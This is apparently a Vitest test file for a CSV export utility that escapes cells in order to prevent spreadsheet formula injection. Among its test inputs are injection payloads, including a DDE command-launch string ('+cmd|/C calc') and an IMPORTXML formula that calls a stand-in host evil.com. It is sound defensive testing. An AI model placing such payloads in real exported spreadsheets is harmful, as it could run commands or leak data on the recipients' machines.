import { describe, it, expect } from 'vitest';
import { sanitizeCsvCell, buildSafeCsv } from '../utils/csvExport';

describe('Safe CSV Export & Formula Injection Prevention', () => {
  it('escapes cells starting with formula triggers (=, +, -, @)', () => {
    expect(sanitizeCsvCell('=SUM(A1:A10)')).toBe('"\'=SUM(A1:A10)"');
    expect(sanitizeCsvCell('+cmd|/C calc')).toBe('"\' +cmd|/C calc"'.replace(' +', '+'));
    expect(sanitizeCsvCell('-100')).toBe('"\' -100"'.replace(' -', '-'));
    expect(sanitizeCsvCell('@IMPORTXML("http://evil.com")')).toBe('"\'@IMPORTXML(""http://evil.com"")"');
  });

  it('escapes tab and carriage return injection vectors', () => {
    expect(sanitizeCsvCell('\tmalicious')).toBe('"\'malicious"');
    expect(sanitizeCsvCell('\rmalicious')).toBe('"\'malicious"');
  });

  it('preserves clean numbers without single-quote prefix', () => {
    expect(sanitizeCsvCell(1234.56)).toBe('1234.56');
    expect(sanitizeCsvCell(0)).toBe('0');
    expect(sanitizeCsvCell(-42)).toBe('-42'); // numeric -42 is a number type
  });

  it('doubles internal quotes to preserve RFC 4180 format', () => {
    expect(sanitizeCsvCell('Apple "Special Edition"')).toBe('"Apple ""Special Edition"""');
  });

  it('handles null and undefined gracefully', () => {
    expect(sanitizeCsvCell(null)).toBe('""');
    expect(sanitizeCsvCell(undefined)).toBe('""');
  });

  it('correctly builds a complete multi-row CSV table', () => {
    const headers = ['Brand', 'Revenue', 'Command'];
    const rows = [
      ['Apple', 84422342.33, 'Normal'],
      ['=EVIL()', 100, '+calc'],
    ];

    const csv = buildSafeCsv(headers, rows);
    expect(csv).toContain('"Brand","Revenue","Command"');
    expect(csv).toContain('"Apple",84422342.33,"Normal"');
    expect(csv).toContain('"\'=EVIL()",100,"\' +calc"'.replace(' +', '+'));
  });
});
